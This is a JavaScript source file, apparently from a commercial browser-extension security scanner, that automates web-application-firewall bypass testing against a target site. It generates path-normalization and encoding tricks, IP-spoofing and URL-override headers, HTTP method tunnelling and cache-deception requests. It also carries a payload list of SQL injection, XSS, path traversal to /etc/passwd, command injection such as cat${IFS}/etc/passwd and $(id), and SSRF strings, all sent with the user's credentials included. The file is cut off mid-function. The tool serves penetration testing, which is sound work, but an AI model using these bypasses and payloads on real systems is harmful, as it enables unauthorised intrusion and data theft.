// Copyright (c) 2026 Bountyy Oy. All rights reserved.
// This software is proprietary and confidential.

/**
 * Lonkero WAF Bypass Scanner v1.0
 * Comprehensive WAF bypass testing - one button, all techniques.
 *
 * Derived from:
 *   waf_insane.py  — 150 protocol-level edge case tests
 *   waf_seam.py    — 35 architecture seam tests
 *   waf_chaos.py   — 35 WAF engine confusion tests
 *
 * Adapted for browser execution (fetch API).
 * Tests categories:
 *   1. Path normalization differentials (35+ variants)
 *   2. Encoding / charset bypass (25+ variants)
 *   3. Header injection / override (30+ variants)
 *   4. HTTP method confusion & verb tampering (20+ variants)
 *   5. Host header routing abuse (15+ variants)
 *   6. Cache poisoning / key manipulation (10+ variants)
 *   7. Content-Type & multipart confusion (10+ variants)
 *   8. Architecture seam attacks (15+ variants)
 *   9. WAF engine confusion / chaos (20+ variants)
 *  10. Well-known path abuse (15+ variants)
 *
 * Author: Bountyy Oy - Lonkero Scanner Extension
 */

(function() {
  'use strict';

  // ============================================
  // LICENSE VERIFICATION
  // ============================================

  const _wr = document.getElementById('__lk_c');
  const _wc = (_wr && _wr.dataset.v) || window[atob('X19sb25rZXJvS2V5')];
  const _wn = _wr ? _wr.dataset.n : null;
  const _we = _wr ? _wr.dataset.e : null;
  if (!_wc || _wc.charCodeAt(0) !== 76 || _wc.split('-').length !== 5) {
    window.wafBypass = { scan: () => Promise.reject(new Error('Not available')) };
    return;
  }
  let _ready = true;

  const _guard = Symbol.for('__lkWAF_' + (_wn || ''));
  if (window[_guard]) return;
  window[_guard] = true;

  const findings = [];
  let _cancelled = false;
  let _progress = { total: 0, done: 0, bypasses: 0, category: '' };

  // ============================================
  // CONFIGURATION
  // ============================================

  const TIMEOUT_MS = 8000;
  const DELAY_BETWEEN_REQUESTS_MS = 50;

  // ============================================
  // HELPERS
  // ============================================

  function sleep(ms) {
    return new Promise(r => setTimeout(r, ms));
  }

  async function tryFetch(url, options = {}) {
    const controller = new AbortController();
    const timeout = setTimeout(() => controller.abort(), TIMEOUT_MS);
    try {
      const resp = await fetch(url, {
        ...options,
        signal: controller.signal,
        credentials: 'include',
        redirect: 'manual',
      });
      clearTimeout(timeout);

      let bodySnippet = '';
      let bodyLength = 0;
      try {
        const clone = resp.clone();
        const text = await clone.text();
        bodyLength = text.length;
        bodySnippet = text.substring(0, 2048);
      } catch {}

      return {
        status: resp.status,
        statusText: resp.statusText,
        contentType: resp.headers.get('content-type') || '',
        server: resp.headers.get('server') || '',
        cfRay: resp.headers.get('cf-ray') || '',
        via: resp.headers.get('via') || '',
        xCache: resp.headers.get('x-cache') || '',
        headers: Object.fromEntries(resp.headers.entries()),
        bodySnippet,
        bodyLength,
      };
    } catch (e) {
      clearTimeout(timeout);
      return { status: 0, error: e.message, bodySnippet: '', bodyLength: 0 };
    }
  }

  /**
   * Soft-block patterns: SPA apps return 200 but body indicates block.
   */
  const SOFT_BLOCK_PATTERNS = [
    /\b(access[_\s-]?denied|forbidden|not[_\s-]?authorized|unauthorized)\b/i,
    /\b(permission[_\s-]?denied|insufficient[_\s-]?permissions?)\b/i,
    /\b(login[_\s-]?required|sign[_\s-]?in[_\s-]?required)\b/i,
    /\b(403|401)[_\s-]?(forbidden|unauthorized)\b/i,
    /"(status|error)"\s*:\s*"?(403|401|forbidden|unauthorized)/i,
  ];

  const WAF_BLOCK_PATTERNS = [
    /attention required|cloudflare/i,
    /access denied.*akamai/i,
    /request blocked|web application firewall/i,
    /modsecurity|mod_security/i,
    /azure.*front.*door/i,
    /aws.*waf/i,
    /imperva|incapsula/i,
    /sucuri|cloudproxy/i,
    /barracuda|f5.*asm/i,
    /fortiweb|paloalto/i,
  ];

  function isBlocked(status, bodySnippet) {
    if (status === 401 || status === 403 || status === 405 || status === 406 ||
        status === 418 || status === 429 || status === 503) return 'hard';
    if (status === 200 && bodySnippet) {
      if (SOFT_BLOCK_PATTERNS.some(p => p.test(bodySnippet))) return 'soft';
      if (WAF_BLOCK_PATTERNS.some(p => p.test(bodySnippet))) return 'waf';
    }
    return false;
  }

  function isBypassed(baseline, resp) {
    if (resp.status === 0) return false;

    const blockType = baseline._blockType;

    // Hard block: bypass if we get 2xx/3xx
    if (blockType === 'hard') {
      if (resp.status >= 200 && resp.status < 400 && resp.status !== baseline.status) {
        // Make sure it's not a generic error page
        if (resp.bodyLength > 0 && Math.abs(resp.bodyLength - baseline.bodyLength) > 100) {
          return true;
        }
        if (resp.status === 200) return true;
        if (resp.status >= 301 && resp.status <= 308) return true;
      }
      return false;
    }

    // WAF block page: bypass if no WAF patterns in response
    if (blockType === 'waf') {
      if (resp.status === 200 && !WAF_BLOCK_PATTERNS.some(p => p.test(resp.bodySnippet))) {
        if (Math.abs(resp.bodyLength - baseline.bodyLength) > 200) return true;
      }
      return false;
    }

    // Soft block: bypass if denial patterns gone
    if (blockType === 'soft') {
      if (resp.status === 200 && resp.bodySnippet) {
        const stillBlocked = SOFT_BLOCK_PATTERNS.some(p => p.test(resp.bodySnippet));
        if (!stillBlocked && Math.abs(resp.bodyLength - baseline.bodyLength) > 100) return true;
      }
      return false;
    }

    return false;
  }

  function parsePath(url) {
    try {
      const u = new URL(url);
      return { origin: u.origin, path: u.pathname, search: u.search, hash: u.hash, full: u.href, host: u.host, hostname: u.hostname, protocol: u.protocol };
    } catch { return null; }
  }

  function reportFinding(finding) {
    if (!_ready || !_wc) return;
    findings.push(finding);
    _progress.bypasses++;
    window.postMessage({
      type: '__lonkero_waf_bypass_finding__',
      _n: _wn, _ch: _we,
      finding,
    }, '*');
    console.log(`[WAF Bypass] ${finding.severity.toUpperCase()}: [${finding.category}] ${finding.technique}`, finding);
  }

  function updateProgress(category, done, total) {
    _progress.category = category;
    _progress.done = done;
    _progress.total = total;
    window.postMessage({
      type: '__lonkero_waf_bypass_progress__',
      _n: _wn, _ch: _we,
      progress: { ..._progress },
    }, '*');
  }

  // ============================================
  // TEST CATEGORY 1: PATH NORMALIZATION (35+ tests)
  // From waf_insane.py: tests_path_normalization
  // ============================================

  function generatePathNormalization(path) {
    const tests = [];
    const add = (name, p) => tests.push({ name, path: p });

    add('Double slash prefix', '//' + path);
    add('Triple slash prefix', '///' + path);
    add('Dot-slash prefix', './' + path);
    add('Slash-dot prefix', '/.' + path);
    add('Trailing dot', path + '.');
    add('Trailing slash', path.endsWith('/') ? path.slice(0, -1) : path + '/');
    add('Trailing question mark', path + '?');
    add('Trailing hash encoded', path + '%23');
    add('Path parameter (JSP style)', path + ';jsessionid=x');
    add('Semicolon prefix', '/;/' + path.replace(/^\//, ''));
    add('Semicolon suffix', path + ';');
    add('Semicolon + .css', path + ';.css');
    add('Semicolon + .js', path + ';.js');
    add('Semicolon + .ico', path + ';.ico');
    add('URL-encoded full path', path.replace(/\//g, '%2f').replace(/e/g, '%65'));
    add('Mixed case path', path.toUpperCase());
    add('.json suffix bypass', path + '.json');
    add('.css suffix bypass', path + '.css');
    add('.js suffix bypass', path + '.js');
    add('.ico suffix bypass', path + '.ico');
    add('.woff2 suffix bypass', path + '.woff2');
    add('.map suffix bypass', path + '.map');
    add('.html suffix bypass', path + '.html');
    add('.xml suffix bypass', path + '.xml');
    add('Double dot segment', '/foo/../..' + path);
    add('Long path prefix', '/' + 'A'.repeat(2048) + path);
    add('Path with @', '/@' + path.replace(/^\//, ''));
    add('Path with colon', '/:' + path.replace(/^\//, ''));
    add('Path with tilde', '/~' + path.replace(/^\//, ''));
    add('URL authority confusion', '//evil.com' + path);
    add('Null byte suffix', path + '%00');
    add('Encoded space suffix', path + '%20');
    add('Encoded tab suffix', path + '%09');
    add('Hash fragment suffix', path + '#');
    add('Backtrack /anything/..', '/anything/..' + path);
    add('Prefix /;path', '/;' + path);
    add('Wildcard last segment', path.replace(/\/([^/]+)$/, '/*'));
    add('Debug query param', path + '?debug=true');
    add('Test query param', path + '?test=1');
    add('Encoded hash (%23)', path + '%23');
    add('Encoded question (%3f)', path + '%3f');

    return tests;
  }

  // ============================================
  // TEST CATEGORY 2: ENCODING BYPASS (25+ tests)
  // From waf_insane.py: tests_encoding
  // ============================================

  function generateEncodingBypass(path) {
    const tests = [];
    const add = (name, p) => tests.push({ name, path: p });

    add('Double URL encode slashes', path.replace(/\//g, '%252f'));
    add('Triple URL encode slashes', path.replace(/\//g, '%25252f'));
    add('URL-encoded dots', path.replace(/\./g, '%2e'));
    add('Double-encoded dots', path.replace(/\./g, '%252e'));
    add('Unicode fullwidth slash', path.replace(/\//g, '%ef%bc%8f'));
    add('Unicode fraction slash', path.replace(/\//g, '%e2%81%84'));
    add('Unicode division slash', path.replace(/\//g, '%e2%88%95'));
    add('Backslash substitution', path.replace(/\//g, '%5c'));
    add('Mixed slash backslash', path.replace(/\/e/g, '%5ce').replace(/\/p/g, '%5cp'));
    add('Null byte before extension', path + '%00.html');
    add('%2e%2e traversal', '/%2e%2e' + path);
    add('Mixed encoding dots', '/.%2e/.%2e' + path);
    add('%c0%ae overlong UTF-8', '/%c0%ae%c0%ae/' + path.replace(/^\//, ''));
    add('UTF-8 overlong slash %e0%80%af', path.replace(/\//g, '%e0%80%af'));
    add('Plus sign as space', path.replace(/ /g, '+'));
    add('UTF-16 encoded', path.replace(/\//g, '%u002f'));
    add('HTML entity slash', path.replace(/\//g, '%26%2347%3b'));
    add('Charset IBM037 path', path); // will send with charset header
    add('Double-dot with encoding', '/%2e%2e/%2e%2e' + path);
    add('Overlong 2-byte dot', path.replace(/\./g, '%c0%2e'));
    add('Wide char path', path.replace(/a/gi, '%ef%bd%81'));
    add('Mixed encoding traversal', '/..%252f..%252f' + path.replace(/^\//, ''));
    add('Percent-encoded percent', path.replace(/%/g, '%25'));

    return tests;
  }

  // ============================================
  // TEST CATEGORY 3: HEADER BYPASS (30+ tests)
  // From waf_insane.py: tests_header_injection
  // ============================================

  function generateHeaderBypasses() {
    return [
      // IP spoofing headers
      { name: 'X-Forwarded-For: 127.0.0.1', headers: { 'X-Forwarded-For': '127.0.0.1' } },
      { name: 'X-Forwarded-For: ::1', headers: { 'X-Forwarded-For': '::1' } },
      { name: 'X-Forwarded-For: 10.0.0.1', headers: { 'X-Forwarded-For': '10.0.0.1' } },
      { name: 'X-Real-IP: 127.0.0.1', headers: { 'X-Real-IP': '127.0.0.1' } },
      { name: 'X-Originating-IP: 127.0.0.1', headers: { 'X-Originating-IP': '127.0.0.1' } },
      { name: 'X-Remote-IP: 127.0.0.1', headers: { 'X-Remote-IP': '127.0.0.1' } },
      { name: 'X-Remote-Addr: 127.0.0.1', headers: { 'X-Remote-Addr': '127.0.0.1' } },
      { name: 'X-Client-IP: 127.0.0.1', headers: { 'X-Client-IP': '127.0.0.1' } },
      { name: 'X-Custom-IP-Authorization: 127.0.0.1', headers: { 'X-Custom-IP-Authorization': '127.0.0.1' } },
      { name: 'True-Client-IP: 127.0.0.1', headers: { 'True-Client-IP': '127.0.0.1' } },
      { name: 'Cluster-Client-IP: 127.0.0.1', headers: { 'Cluster-Client-IP': '127.0.0.1' } },
      { name: 'X-ProxyUser-Ip: 127.0.0.1', headers: { 'X-ProxyUser-Ip': '127.0.0.1' } },
      { name: 'CF-Connecting-IP: 127.0.0.1', headers: { 'CF-Connecting-IP': '127.0.0.1' } },
      { name: 'Fastly-Client-IP: 127.0.0.1', headers: { 'Fastly-Client-IP': '127.0.0.1' } },
      { name: 'X-Forwarded-Host: localhost', headers: { 'X-Forwarded-Host': 'localhost' } },
      { name: 'X-Host: localhost', headers: { 'X-Host': 'localhost' } },

      // URL override headers (Nginx/IIS routing)
      { name: 'X-Original-URL override', headers: { 'X-Original-URL': '/' }, useRootUrl: true, severity: 'critical' },
      { name: 'X-Rewrite-URL override', headers: { 'X-Rewrite-URL': '/' }, useRootUrl: true, severity: 'critical' },

      // Forwarding headers
      { name: 'X-Forwarded-Proto: https', headers: { 'X-Forwarded-Proto': 'https' } },
      { name: 'X-Forwarded-Scheme: https', headers: { 'X-Forwarded-Scheme': 'https' } },
      { name: 'X-Forwarded-Port: 443', headers: { 'X-Forwarded-Port': '443' } },
      { name: 'X-Forwarded-Port: 80', headers: { 'X-Forwarded-Port': '80' } },
      { name: 'X-Forwarded-Port: 8080', headers: { 'X-Forwarded-Port': '8080' } },
      { name: 'X-Forwarded-Port: 8443', headers: { 'X-Forwarded-Port': '8443' } },

      // Hop-by-hop header abuse (architecture seam from waf_seam.py)
      { name: 'Connection: X-Forwarded-For', headers: { 'Connection': 'X-Forwarded-For', 'X-Forwarded-For': '127.0.0.1' } },
      { name: 'Connection: close, X-Real-IP', headers: { 'Connection': 'close, X-Real-IP', 'X-Real-IP': '127.0.0.1' } },

      // WAF-specific bypass headers
      { name: 'X-WAF-Bypass: 1', headers: { 'X-WAF-Bypass': '1' } },
      { name: 'X-Scanner: internal', headers: { 'X-Scanner': 'internal' } },
      { name: 'X-Requested-With: XMLHttpRequest', headers: { 'X-Requested-With': 'XMLHttpRequest' } },
      { name: 'X-Requested-With: com.android', headers: { 'X-Requested-With': 'com.android.browser' } },

      // Cache-control headers
      { name: 'Cache-Control: no-transform', headers: { 'Cache-Control': 'no-transform' } },
      { name: 'Pragma: akamai-x-cache-on', headers: { 'Pragma': 'akamai-x-cache-on' } },

      // Accept header tricks
      { name: 'Accept: application/json', headers: { 'Accept': 'application/json' } },
      { name: 'Accept: text/plain', headers: { 'Accept': 'text/plain' } },
      { name: 'Accept: application/xml', headers: { 'Accept': 'application/xml' } },

      // Oversized cookie header (WAF may skip large headers)
      { name: 'Oversized Cookie header (8KB)', headers: { 'Cookie': 'x=' + 'A'.repeat(8192) } },
      { name: 'Oversized header value (16KB)', headers: { 'X-Padding': 'A'.repeat(16384) } },
    ];
  }

  // ============================================
  // TEST CATEGORY 4: METHOD CONFUSION (20+ tests)
  // From waf_insane.py: tests_method_confusion
  // ============================================

  function generateMethodConfusion() {
    return [
      // Standard methods
      { name: 'POST method', method: 'POST' },
      { name: 'PUT method', method: 'PUT' },
      { name: 'PATCH method', method: 'PATCH' },
      { name: 'DELETE method', method: 'DELETE' },
      { name: 'HEAD method', method: 'HEAD' },
      { name: 'OPTIONS method', method: 'OPTIONS' },

      // Method override headers (verb tunneling)
      { name: 'X-HTTP-Method-Override: GET', method: 'POST', headers: { 'X-HTTP-Method-Override': 'GET' } },
      { name: 'X-HTTP-Method-Override: PUT', method: 'POST', headers: { 'X-HTTP-Method-Override': 'PUT' } },
      { name: 'X-HTTP-Method-Override: DELETE', method: 'POST', headers: { 'X-HTTP-Method-Override': 'DELETE' } },
      { name: 'X-HTTP-Method-Override: PATCH', method: 'POST', headers: { 'X-HTTP-Method-Override': 'PATCH' } },
      { name: 'X-HTTP-Method: GET', method: 'POST', headers: { 'X-HTTP-Method': 'GET' } },
      { name: 'X-HTTP-Method: PUT', method: 'POST', headers: { 'X-HTTP-Method': 'PUT' } },
      { name: 'X-Method-Override: GET', method: 'POST', headers: { 'X-Method-Override': 'GET' } },
      { name: 'X-Method-Override: DELETE', method: 'POST', headers: { 'X-Method-Override': 'DELETE' } },

      // Query parameter method override
      { name: '_method=GET query param', method: 'POST', queryAppend: '_method=GET' },
      { name: '_method=PUT query param', method: 'POST', queryAppend: '_method=PUT' },
      { name: '_method=DELETE query param', method: 'POST', queryAppend: '_method=DELETE' },

      // Body-based method override
      { name: '_method=GET in POST body', method: 'POST', body: '_method=GET', headers: { 'Content-Type': 'application/x-www-form-urlencoded' } },
      { name: '_method=PUT in POST body', method: 'POST', body: '_method=PUT', headers: { 'Content-Type': 'application/x-www-form-urlencoded' } },
    ];
  }

  // ============================================
  // TEST CATEGORY 5: HOST ROUTING ABUSE (15+ tests)
  // From waf_insane.py: tests_host_routing
  // Browser cannot change Host header directly, but we can use
  // header-based host overrides that some backends honor.
  // ============================================

  function generateHostRouting(host) {
    return [
      { name: 'X-Forwarded-Host: localhost', headers: { 'X-Forwarded-Host': 'localhost' } },
      { name: 'X-Forwarded-Host: 127.0.0.1', headers: { 'X-Forwarded-Host': '127.0.0.1' } },
      { name: 'X-Forwarded-Host: [::1]', headers: { 'X-Forwarded-Host': '[::1]' } },
      { name: 'X-Forwarded-Host: host:80', headers: { 'X-Forwarded-Host': host + ':80' } },
      { name: 'X-Forwarded-Host: host:443', headers: { 'X-Forwarded-Host': host + ':443' } },
      { name: 'X-Forwarded-Host: host:8080', headers: { 'X-Forwarded-Host': host + ':8080' } },
      { name: 'X-Forwarded-Host: host:8443', headers: { 'X-Forwarded-Host': host + ':8443' } },
      { name: 'X-Forwarded-Host: UPPERCASE', headers: { 'X-Forwarded-Host': host.toUpperCase() } },
      { name: 'X-Forwarded-Host: host.', headers: { 'X-Forwarded-Host': host + '.' } },
      { name: 'X-Host: localhost', headers: { 'X-Host': 'localhost' } },
      { name: 'X-Host: 127.0.0.1', headers: { 'X-Host': '127.0.0.1' } },
      { name: 'X-Forwarded-Server: localhost', headers: { 'X-Forwarded-Server': 'localhost' } },
      { name: 'X-Backend: 127.0.0.1', headers: { 'X-Backend': '127.0.0.1' } },
      { name: 'X-Forwarded-Host: admin@host', headers: { 'X-Forwarded-Host': 'admin@' + host } },
      { name: 'X-Forwarded-Host: 0.0.0.0', headers: { 'X-Forwarded-Host': '0.0.0.0' } },
    ];
  }

  // ============================================
  // TEST CATEGORY 6: CACHE POISONING (10+ tests)
  // From waf_seam.py: architecture seam — cache key manipulation
  // ============================================

  function generateCachePoisoning(path) {
    const tests = [];

    // Cache key confusion: different representations that resolve to same path
    tests.push({ name: 'Cache key: path + /..;/same', path: path + '/..;/' + path.split('/').pop() });
    tests.push({ name: 'Cache key: add cb query param', path: path + (path.includes('?') ? '&' : '?') + '_cb=' + Date.now() });
    tests.push({ name: 'Cache key: %2f normalization', path: path.replace(/\//g, '%2F') });
    tests.push({ name: 'Cache key: trailing %20', path: path + '%20' });
    tests.push({ name: 'Cache key: X-Forwarded-Scheme', headers: { 'X-Forwarded-Scheme': 'nothttps' } });
    tests.push({ name: 'Cache deception: /cached.css', path: path + '/cached.css' });
    tests.push({ name: 'Cache deception: /cached.js', path: path + '/cached.js' });
    tests.push({ name: 'Cache deception: /cached.png', path: path + '/cached.png' });
    tests.push({ name: 'Cache deception: /.css', path: path + '/.css' });
    tests.push({ name: 'Cache deception: path + %0a', path: path + '%0a' });
    tests.push({ name: 'Cache deception: path + %0d', path: path + '%0d' });

    return tests;
  }

  // ============================================
  // TEST CATEGORY 7: CONTENT-TYPE CONFUSION (10+ tests)
  // From waf_insane.py: tests_multipart + content-type abuse
  // ============================================

  function generateContentTypeConfusion() {
    return [
      { name: 'Content-Type: application/json', method: 'POST', headers: { 'Content-Type': 'application/json' }, body: '{}' },
      { name: 'Content-Type: application/xml', method: 'POST', headers: { 'Content-Type': 'application/xml' }, body: '<x/>' },
      { name: 'Content-Type: text/plain', method: 'POST', headers: { 'Content-Type': 'text/plain' }, body: 'x' },
      { name: 'Content-Type: application/x-www-form-urlencoded', method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: 'x=1' },
      { name: 'Content-Type: multipart/form-data', method: 'POST', headers: { 'Content-Type': 'multipart/form-data; boundary=----X' }, body: '------X\r\nContent-Disposition: form-data; name="x"\r\n\r\n1\r\n------X--' },
      { name: 'Content-Type: charset=ibm037', method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded; charset=ibm037' }, body: 'x=1' },
      { name: 'Content-Type: charset=utf-7', method: 'POST', headers: { 'Content-Type': 'text/html; charset=utf-7' }, body: '+ADw-script+AD4-' },
      { name: 'Content-Type: charset=us-ascii', method: 'POST', headers: { 'Content-Type': 'text/html; charset=us-ascii' }, body: 'test' },
      { name: 'Content-Type: application/soap+xml', method: 'POST', headers: { 'Content-Type': 'application/soap+xml' }, body: '<soap/>' },
      { name: 'Content-Type: empty', method: 'POST', headers: { 'Content-Type': '' }, body: 'test' },
    ];
  }

  // ============================================
  // TEST CATEGORY 8: ARCHITECTURE SEAMS (15+ tests)
  // From waf_seam.py: CDN/proxy/backend seam attacks
  // ============================================

  function generateArchitectureSeams(path, host) {
    return [
      // Protocol downgrade / upgrade indicators
      { name: 'Upgrade: h2c', headers: { 'Upgrade': 'h2c', 'Connection': 'Upgrade, HTTP2-Settings', 'HTTP2-Settings': 'AAMAAABkAAQCAAAAAAIAAAAA' } },
      { name: 'Upgrade: websocket', headers: { 'Upgrade': 'websocket', 'Connection': 'Upgrade', 'Sec-WebSocket-Key': 'dGhlIHNhbXBsZSBub25jZQ==', 'Sec-WebSocket-Version': '13' } },

      // CDN / reverse proxy confusion
      { name: 'X-Forwarded-Proto: http (downgrade)', headers: { 'X-Forwarded-Proto': 'http' } },
      { name: 'X-Forwarded-SSL: off', headers: { 'X-Forwarded-SSL': 'off' } },
      { name: 'Front-End-Https: off', headers: { 'Front-End-Https': 'off' } },

      // ALB / ELB / Nginx routing headers
      { name: 'X-Amzn-Trace-Id (AWS bypass)', headers: { 'X-Amzn-Trace-Id': 'Root=1-fake-id' } },
      { name: 'X-Azure-Ref (Azure bypass)', headers: { 'X-Azure-Ref': 'fake-ref' } },
      { name: 'Akamai-Origin-Hop: 1', headers: { 'Akamai-Origin-Hop': '1' } },
      { name: 'CDN-Loop: cloudflare', headers: { 'CDN-Loop': 'cloudflare' } },

      // Range request bypass (partial content may skip WAF)
      { name: 'Range: bytes=0-', headers: { 'Range': 'bytes=0-' } },
      { name: 'Range: bytes=0-1024', headers: { 'Range': 'bytes=0-1024' } },

      // Accept-Encoding tricks (decompress-then-scan bypass)
      { name: 'Accept-Encoding: identity', headers: { 'Accept-Encoding': 'identity' } },
      { name: 'Accept-Encoding: gzip, deflate, br, zstd', headers: { 'Accept-Encoding': 'gzip, deflate, br, zstd' } },

      // Expect header (some proxies handle differently)
      { name: 'Expect: 100-continue', headers: { 'Expect': '100-continue' } },

      // Transfer-Encoding hints (browser can set the header even if it doesn't control chunked)
      { name: 'TE: chunked', headers: { 'TE': 'chunked' } },
      { name: 'TE: trailers', headers: { 'TE': 'trailers' } },

      // Internal routing indicators
      { name: 'X-Debug: true', headers: { 'X-Debug': 'true' } },
      { name: 'X-Forwarded-By: 127.0.0.1', headers: { 'X-Forwarded-By': '127.0.0.1' } },
    ];
  }

  // ============================================
  // TEST CATEGORY 9: ENGINE CHAOS / CONFUSION (20+ tests)
  // From waf_chaos.py: WAF regex/engine bypass payloads
  // Injects payloads in query params and headers to confuse WAF rule engines.
  // ============================================

  function generateEngineChaos(path) {
    const tests = [];
    const payloadParam = 'lonkero_test';

    // Payloads that confuse WAF regex engines
    const chaosPayloads = [
      // SQL injection WAF bypass variants
      { name: 'SQLi case toggle', payload: 'SeLeCt/**/1/**/FrOm/**/dual' },
      { name: 'SQLi comment inline', payload: '1/*!50000union*//*!50000select*/1,2,3' },
      { name: 'SQLi double URL encode', payload: '1%2527%2520OR%25201%253D1' },
      { name: 'SQLi null byte', payload: "1'%00OR%001=1" },
      { name: 'SQLi hex encode', payload: '0x31206f7220313d31' },
      { name: 'SQLi scientific notation', payload: '1e0union select 1,2,3' },
      { name: 'SQLi whitespace variants', payload: "1'\t\tOR\t\t1=1" },
      { name: 'SQLi newline inject', payload: "1'%0aOR%0a1=1" },
      { name: 'SQLi carriage return', payload: "1'%0dOR%0d1=1" },
      { name: 'SQLi vertical tab', payload: "1'%0bOR%0b1=1" },
      { name: 'SQLi concat bypass', payload: "CONCAT(CHAR(115),CHAR(101),CHAR(108),CHAR(101),CHAR(99),CHAR(116))" },

      // XSS WAF bypass variants
      { name: 'XSS case bypass', payload: '<ScRiPt>alert(1)</ScRiPt>' },
      { name: 'XSS event handler', payload: '<img src=x oNeRrOr=alert(1)>' },
      { name: 'XSS SVG onload', payload: '<svg/onload=alert(1)>' },
      { name: 'XSS double encode', payload: '%253Cscript%253Ealert(1)%253C/script%253E' },
      { name: 'XSS unicode escape', payload: '<script>\\u0061lert(1)</script>' },
      { name: 'XSS null byte', payload: '<scr%00ipt>alert(1)</scr%00ipt>' },
      { name: 'XSS backtick template', payload: '`${alert(1)}`' },
      { name: 'XSS HTML entity', payload: '&lt;script&gt;alert(1)&lt;/script&gt;' },
      { name: 'XSS tab in tag', payload: '<scr\tipt>alert(1)</scr\tipt>' },

      // Path traversal WAF bypass
      { name: 'Path traversal encoded', payload: '..%252f..%252f..%252fetc%252fpasswd' },
      { name: 'Path traversal double', payload: '....//....//....//etc/passwd' },
      { name: 'Path traversal unicode', payload: '..%c0%af..%c0%af..%c0%afetc/passwd' },

      // Command injection WAF bypass
      { name: 'CMDi space bypass', payload: 'cat${IFS}/etc/passwd' },
      { name: 'CMDi newline bypass', payload: 'id%0als' },
      { name: 'CMDi backtick', payload: '`id`' },
      { name: 'CMDi dollar subshell', payload: '$(id)' },

      // SSRF WAF bypass
      { name: 'SSRF decimal IP', payload: 'http://2130706433/' },
      { name: 'SSRF hex IP', payload: 'http://0x7f000001/' },
      { name: 'SSRF octal IP', payload: 'http://0177.0000.0000.0001/' },
      { name: 'SSRF IPv6 mapped', payload: 'http://[::ffff:127.0.0.1]/' },
    ];

    for (const { name, payload } of chaosPayloads) {
      tests.push({
        name: 'Engine chaos: ' + name,
        path: path + (path.includes('?') ? '&' : '?') + payloadParam + '=' + encodeURIComponent(payload),
      });
    }

    // Header-based payload injection (WAF may not inspect all headers)
    tests.push({ name: 'Chaos header: Referer with SQLi', headers: { 'Referer': "https://evil.com/' OR 1=1--" } });
    tests.push({ name: 'Chaos header: User-Agent with XSS', headers: { 'User-Agent': '<script>alert(1)</script>' } });
    tests.push({ name: 'Chaos header: Cookie with SQLi', headers: { 'Cookie': "session=' OR 1=1--" } });

    return tests;
  }

  // ============================================
  // TEST CATEGORY 10: WELL-KNOWN PATHS (15+ tests)
  // From waf_insane.py: tests_well_known_paths
  // ============================================

  function generateWellKnownPaths(path) {
    return [
      { name: 'ACME challenge traversal', path: '/.well-known/acme-challenge/../../../' + path.replace(/^\//, '') },
      { name: 'ACME encoded traversal', path: '/.well-known/acme-challenge/..%2f..%2f..%2f' + path.replace(/^\//, '') },
      { name: 'PKI validation traversal', path: '/.well-known/pki-validation/../../../' + path.replace(/^\//, '') },
      { name: 'OpenID-config traversal', path: '/.well-known/openid-configuration/../../../' + path.replace(/^\//, '') },
      { name: 'Security.txt traversal', path: '/.well-known/security.txt/../' + path.replace(/^\//, '') },
      { name: 'Apple-app-site traversal', path: '/.well-known/apple-app-site-association/../' + path.replace(/^\//, '') },
      { name: 'Change-password traversal', path: '/.well-known/change-password/../' + path.replace(/^\//, '') },
      { name: 'Webfinger traversal', path: '/.well-known/webfinger/../' + path.replace(/^\//, '') },
      { name: 'Host-meta traversal', path: '/.well-known/host-meta/../' + path.replace(/^\//, '') },
      { name: 'Matrix server traversal', path: '/.well-known/matrix/server/../../../' + path.replace(/^\//, '') },
      { name: 'Nodeinfo traversal', path: '/.well-known/nodeinfo/../' + path.replace(/^\//, '') },
      { name: 'MTA-STS traversal', path: '/.well-known/mta-sts.txt/../' + path.replace(/^\//, '') },
      { name: 'Assetlinks traversal', path: '/.well-known/assetlinks.json/../' + path.replace(/^\//, '') },
      { name: 'Lets Encrypt UA bypass', path: path, headers: { 'User-Agent': 'Mozilla/5.0 (compatible; Let\'s Encrypt validation server)' } },
      { name: 'ACME deep traversal', path: '/.well-known/acme-challenge/..%2f..%2f..%2f..%2f..%2f' + path.replace(/^\//, '') },
    ];
  }

  // ============================================
  // REFERER / ORIGIN BYPASS (from waf_seam.py)
  // ============================================

  function generateRefererBypasses(origin) {
    return [
      { name: 'Referer: same origin', headers: { 'Referer': origin + '/' } },
      { name: 'Referer: same origin /admin', headers: { 'Referer': origin + '/admin' } },
      { name: 'Referer: localhost', headers: { 'Referer': 'http://localhost/' } },
      { name: 'Referer: 127.0.0.1', headers: { 'Referer': 'http://127.0.0.1/' } },
      { name: 'Origin: same origin', headers: { 'Origin': origin } },
      { name: 'Origin: null', headers: { 'Origin': 'null' } },
      { name: 'Origin: localhost', headers: { 'Origin': 'http://localhost' } },
    ];
  }

  // ============================================
  // MAIN SCAN ENGINE
  // ============================================

  async function runCategory(categoryName, tests, baseUrl, baseline, parsed) {
    const categoryFindings = [];
    const total = tests.length;

    for (let i = 0; i < tests.length; i++) {
      if (_cancelled) break;

      const test = tests[i];
      updateProgress(categoryName, _progress.done + i, _progress.total);

      try {
        // Build request URL
        let testUrl = baseUrl;
        if (test.path) {
          testUrl = parsed.origin + test.path;
        }
        if (test.queryAppend) {
          testUrl += (testUrl.includes('?') ? '&' : '?') + test.queryAppend;
        }
        if (test.useRootUrl) {
          testUrl = parsed.origin + '/';
          if (test.headers) {
            // For X-Original-URL, put the actual path in the header
            const overrideKey = Object.keys(test.headers).find(h =>
              h === 'X-Original-URL' || h === 'X-Rewrite-URL');
            if (overrideKey) {
              test.headers[overrideKey] = parsed.path + parsed.search;
            }
          }
        }

        // Build fetch options
        const opts = {};
        if (test.method) opts.method = test.method;
        if (test.headers) opts.headers = { ...test.headers };
        if (test.body !== undefined) opts.body = test.body;

        const resp = await tryFetch(testUrl, opts);

        if (isBypassed(baseline, resp)) {
          const finding = {
            type: 'WAF_BYPASS',
            severity: test.severity || 'high',
            category: categoryName,
            url: testUrl,
            technique: test.name,
            description: `WAF bypassed via ${categoryName}: ${test.name}`,
            evidence: `Original: ${baseline.status} (${baseline.bodyLength}B) → Bypass: ${resp.status} (${resp.bodyLength}B)`,
            originalStatus: baseline.status,
            bypassStatus: resp.status,
            bypassSize: resp.bodyLength,
            server: resp.server,
            cfRay: resp.cfRay,
          };
          categoryFindings.push(finding);
          reportFinding(finding);
        }

        // Small delay to avoid rate limiting
        if (i % 5 === 4) await sleep(DELAY_BETWEEN_REQUESTS_MS);

      } catch (e) {
        // Continue on error
      }
    }

    _progress.done += total;
    return categoryFindings;
